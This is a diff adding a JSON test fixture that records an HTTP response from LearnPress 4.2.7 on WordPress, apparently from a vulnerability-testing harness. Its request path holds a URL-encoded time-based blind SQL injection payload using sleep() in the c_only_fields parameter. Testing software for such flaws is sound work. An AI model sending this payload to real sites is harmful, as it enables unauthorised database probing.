@@ -1,0 +1,16 @@
+{
+  "provenance": {
+    "run": "20261116T161222-c00a94/learnpress_fields_cached",
+    "capture": "cached-repeat-50",
+    "application": "Unmodified LearnPress 4.2.7 on WordPress 6.8.3/PHP 8.3.28/MariaDB 11.2.2",
+    "source": "Native real HTTP cache-hit response after priming the original 100-value nonce pool; no module transport stubs in that run.",
+    "unit_limit": "This fixture supplies the received HTTP object only; unit tests do not reproduce timing or application cache behavior."
+  },
+  "request_path": "/learnpress/v1/courses?c_only_fields=IF%28COUNT%28*%29%21%3D-50%2C%28if%281%3D1%2Csleep%280.4%29%2C0%29%29%2C0%29&rest_route=%2Flearnpress%2Fv1%2Fcourses",
+  "code": 200,
+  "body_base64": "W10=",
+  "body_sha256": "4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945",
+  "content_type": [
+    "application/json; charset=UTF-8"
+  ]
+}
